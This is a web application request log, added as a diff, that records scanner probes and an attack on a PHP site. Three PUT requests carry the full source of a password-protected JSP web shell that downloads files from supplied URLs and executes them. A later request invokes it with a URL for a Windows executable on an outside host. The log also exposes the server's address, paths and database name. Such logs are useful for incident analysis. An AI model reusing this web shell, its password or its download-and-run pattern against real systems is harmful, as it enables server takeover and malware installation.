@@ -1,0 +1,2382 @@
+---------------------------------------------------------------
+[ 2019-10-12T00:06:32+08:00 ] 172.16.170.169 178.156.83.254 GET /
+[ info ] 47.96.126.228:80/ [运行时间：0.030414s][吞吐率：32.88req/s] [内存消耗：3,922.77kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
+  'content-length' => '0',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000335s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000687s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000188s ]
+---------------------------------------------------------------
+[ 2019-10-12T03:24:15+08:00 ] 172.16.170.169 46.246.45.105 GET /muieblackcat
+[ info ] 47.96.126.228/muieblackcat [运行时间：0.018798s][吞吐率：53.20req/s] [内存消耗：1,657.23kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'muieblackcat',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-language' => 'en-us',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => '47.96.126.228',
+  'connection' => 'Close',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T04:12:38+08:00 ] 172.16.170.169 47.96.25.234 PUT /FxCodeShell.jsp%20
+[ info ] 47.96.126.228/FxCodeShell.jsp%20 [运行时间：0.013580s][吞吐率：73.64req/s] [内存消耗：1,677.11kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'FxCodeShell.jsp ',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'content-type' => 'text/plain; Charset=UTF-8',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://47.96.126.228:80/FxCodeShell.jsp%20',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'content-length' => '3365',
+  'host' => '47.96.126.228',
+)
+[ info ] [ PARAM ] array (
+  '<%@_page_import' => '"java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS   "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "%SystemRoot%/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i  ) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:"   urls[i]   "<br>");
+			out.write("<br>filename:"   fileName   "<br>");
+			out.write("<br>Size:"   urls.length   "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							  "<br><br>");
+			File isfile = new File(path   fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path   fileName);
+					} else {
+						String chmod = "chmod 777 "   path   fileName;
+						exec.exec(chmod);
+						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
+  '1_' => '',
+  '");
+					}
+				}_catch_(Exception_e1)_{
+					e1_printStackTrace();
+				}
+				continue;
+			}
+			URL_downloadUrl_' => ' new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path   fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path   fileName);
+			} else {
+				String chmod = "chmod 777 "   path   fileName;
+				exec.exec(chmod);
+				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
+  '");
+			}
+		}_catch_(Exception_e2)_{
+			e2_printStackTrace();
+		}
+	}
+%>' => '',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T04:12:38+08:00 ] 172.16.170.169 47.96.25.234 PUT /FxCodeShell.jsp::$DATA
+[ info ] 47.96.126.228/FxCodeShell.jsp::$DATA [运行时间：0.014300s][吞吐率：69.93req/s] [内存消耗：1,677.13kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'FxCodeShell.jsp::$DATA',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'content-type' => 'text/plain; Charset=UTF-8',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://47.96.126.228:80/FxCodeShell.jsp::$DATA',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'content-length' => '3365',
+  'host' => '47.96.126.228',
+)
+[ info ] [ PARAM ] array (
+  '<%@_page_import' => '"java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS   "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "%SystemRoot%/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i  ) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:"   urls[i]   "<br>");
+			out.write("<br>filename:"   fileName   "<br>");
+			out.write("<br>Size:"   urls.length   "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							  "<br><br>");
+			File isfile = new File(path   fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path   fileName);
+					} else {
+						String chmod = "chmod 777 "   path   fileName;
+						exec.exec(chmod);
+						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
+  '1_' => '',
+  '");
+					}
+				}_catch_(Exception_e1)_{
+					e1_printStackTrace();
+				}
+				continue;
+			}
+			URL_downloadUrl_' => ' new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path   fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path   fileName);
+			} else {
+				String chmod = "chmod 777 "   path   fileName;
+				exec.exec(chmod);
+				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
+  '");
+			}
+		}_catch_(Exception_e2)_{
+			e2_printStackTrace();
+		}
+	}
+%>' => '',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T04:12:38+08:00 ] 172.16.170.169 47.96.25.234 PUT /FxCodeShell.jsp/
+[ info ] 47.96.126.228/FxCodeShell.jsp/ [运行时间：0.013669s][吞吐率：73.16req/s] [内存消耗：1,677.02kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'FxCodeShell.jsp',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'content-type' => 'text/plain; Charset=UTF-8',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://47.96.126.228:80/FxCodeShell.jsp/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'content-length' => '3365',
+  'host' => '47.96.126.228',
+)
+[ info ] [ PARAM ] array (
+  '<%@_page_import' => '"java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS   "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "%SystemRoot%/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i  ) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:"   urls[i]   "<br>");
+			out.write("<br>filename:"   fileName   "<br>");
+			out.write("<br>Size:"   urls.length   "<br>");
+			out.write(
+					"-------------------------------------------------------------------------------------------------------"
+							  "<br><br>");
+			File isfile = new File(path   fileName);
+			if (isfile.isFile()) {
+				try {
+					Runtime exec = Runtime.getRuntime();
+					if (systemCode == 1) {
+						exec.exec(path   fileName);
+					} else {
+						String chmod = "chmod 777 "   path   fileName;
+						exec.exec(chmod);
+						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
+  '1_' => '',
+  '");
+					}
+				}_catch_(Exception_e1)_{
+					e1_printStackTrace();
+				}
+				continue;
+			}
+			URL_downloadUrl_' => ' new URL(urls[i]);
+			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
+			conn.setConnectTimeout(60000 * 3);
+			conn.setReadTimeout(60000 * 3);
+			fileInputSteam = conn.getInputStream();
+			fileOutputStream = new FileOutputStream(path   fileName);
+			int length = -1;
+			byte[] b = new byte[409600];
+			while ((length = fileInputSteam.read(b)) != -1) {
+				fileOutputStream.write(b, 0, length);
+				fileOutputStream.flush();
+			}
+			if (conn != null) {
+				conn.disconnect();
+			}
+			if (fileInputSteam != null) {
+				fileInputSteam.close();
+			}
+			if (fileOutputStream != null) {
+				fileOutputStream.close();
+			}
+			Runtime exec = Runtime.getRuntime();
+			if (systemCode == 1) {
+				exec.exec(path   fileName);
+			} else {
+				String chmod = "chmod 777 "   path   fileName;
+				exec.exec(chmod);
+				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
+  '");
+			}
+		}_catch_(Exception_e2)_{
+			e2_printStackTrace();
+		}
+	}
+%>' => '',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T04:12:38+08:00 ] 172.16.170.169 47.96.25.234 GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fky.dfg45dfg45.best/download.exe
+[ info ] 47.96.126.228/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fky.dfg45dfg45.best/download.exe [运行时间：0.013369s][吞吐率：74.80req/s] [内存消耗：1,659.29kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'FxCodeShell.jsp',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'Keep-Alive',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn',
+  'referer' => 'http://47.96.126.228:80/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fky.dfg45dfg45.best/download.exe',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'view' => 'FxxkMyLie1836710Aa',
+  'os' => '1',
+  'address' => 'http://fky.dfg45dfg45.best/download.exe',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T05:05:20+08:00 ] 172.16.170.169 119.15.94.86 GET /
+[ info ] 47.96.126.228:80/ [运行时间：0.031429s][吞吐率：31.82req/s] [内存消耗：3,923.06kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.126.228:80',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
+  'content-length' => '0',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000334s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000761s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000216s ]
+---------------------------------------------------------------
+[ 2019-10-12T05:42:08+08:00 ] 172.16.170.169 185.100.87.245 POST /sdk
+[ info ] 47.96.126.228/sdk [运行时间：0.021168s][吞吐率：47.24req/s] [内存消耗：1,658.09kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'sdk',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'content-length' => '441',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T05:42:08+08:00 ] 172.16.170.169 185.100.87.245 GET /nmaplowercheck1570830127
+[ info ] 47.96.126.228/nmaplowercheck1570830127 [运行时间：0.014815s][吞吐率：67.50req/s] [内存消耗：1,657.16kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'nmaplowercheck1570830127',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T05:42:09+08:00 ] 172.16.170.169 185.100.87.245 GET /
+[ info ] 47.96.126.228/ [运行时间：0.030472s][吞吐率：32.82req/s] [内存消耗：3,922.41kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000320s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000689s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000193s ]
+---------------------------------------------------------------
+[ 2019-10-12T05:42:09+08:00 ] 172.16.170.169 185.100.87.245 GET /evox/about
+[ info ] 47.96.126.228/evox/about [运行时间：0.014605s][吞吐率：68.47req/s] [内存消耗：1,656.91kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'evox',
+    1 => 'about',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T05:42:10+08:00 ] 172.16.170.169 185.100.87.245 GET /HNAP1
+[ info ] 47.96.126.228/HNAP1 [运行时间：0.013973s][吞吐率：71.57req/s] [内存消耗：1,656.82kb] [文件加载：33]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'HNAP1',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-10-12T05:42:10+08:00 ] 172.16.170.169 185.100.87.245 HEAD /
+[ info ] 47.96.126.228/ [运行时间：0.031986s][吞吐率：31.26req/s] [内存消耗：3,923.12kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000395s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000826s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000233s ]
+---------------------------------------------------------------
+[ 2019-10-12T05:42:11+08:00 ] 172.16.170.169 185.100.87.245 HEAD /user/index/login
+[ info ] 47.96.126.228/user/index/login [运行时间：0.037454s][吞吐率：26.70req/s] [内存消耗：3,960.54kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+  'host' => '47.96.126.228',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\Index->login[ /www/wwwroot/web/application/user/controller/Index.php ]
+[ info ] [ VIEW ] /www/wwwroot/web/application/user/view/index/login.html [ array (
+  0 => 'request',
+  1 => 'param',
+  2 => 'userAgentType',
+  3 => 'is_super',
+  4 => 'allcinfig',
+  5 => 'msgNum',
+  6 => '__menu__',
+  7 => 'meta_title',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000358s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000722s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000207s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin` [ RunTime:0.000743s ]
+[ sql ] [ SQL ] SELECT `role_id`,`user_type` FROM `rk_admin` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000170s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_admin_role` [ RunTime:0.000539s ]
+[ sql ] [ SQL ] SELECT `rule_items` FROM `rk_admin_role` WHERE  `id` IS NULL LIMIT 1 [ RunTime:0.000140s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_menu` [ RunTime:0.000583s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`pid`,`url` FROM `rk_menu` WHERE  `id` IN (0) [ RunTime:0.000183s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_site` [ RunTime:0.000525s ]
+[ sql ] [ SQL ] SELECT `logo`,`name` FROM `rk_site` WHERE  `domain` = 'http://47.96.126.228' LIMIT 1 [ RunTime:0.000155s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_message` [ RunTime:0.000488s ]
+[ sql ] [ SQL ] SELECT COUNT(id) AS tp_count FROM `rk_message` WHERE  `member_id` = null  AND `status` = 0 LIMIT 1 [ RunTime:0.000192s ]
+[ sql ] [ SQL ] SELECT `id`,`title`,`url`,`icon`,`pid` FROM `rk_menu` WHERE  `hide` = 0  AND `type` = 'user'  AND `id` IN ('') ORDER BY sort asc [ RunTime:0.000165s ]
+[ log ] ###user_id=time=2019-10-12 05:42:11function=user/index/login
+---------------------------------------------------------------
+[ 2019-10-12T06:29:20+08:00 ] 172.16.170.169 47.100.127.188 GET /
+[ info ] s-6-2111.pssdss.com/ [运行时间：0.031109s][吞吐率：32.15req/s] [内存消耗：3,922.85kb] [文件加载：57]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'user',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000341s ] mysql:dbname=telrobot;host=127.0.0.1;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `rk_config` [ RunTime:0.000752s ]
+[ sql ] [ SQL ] SELECT `type`,`name`,`value` FROM `rk_config` WHERE  `status` = 1 [ RunTime:0.000225s ]
+---------------------------------------------------------------
+[ 2019-10-12T06:29:20+08:00 ] 172.16.170.169 47.100.127.188 GET /user/index/login
+[ info ] s-6-2111.pssdss.com/user/index/login [运行时间：0.033665s][吞吐率：29.70req/s] [内存消耗：3,960.72kb] [文件加载：56]
+[ info ] [ LANG ] /www/wwwroot/web/core/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'host' => 's-6-2111.pssdss.com',
+  'connection' => 'Keep-Alive',
+  'accept-encoding' => 'gzip',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ CACHE ] INIT File
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
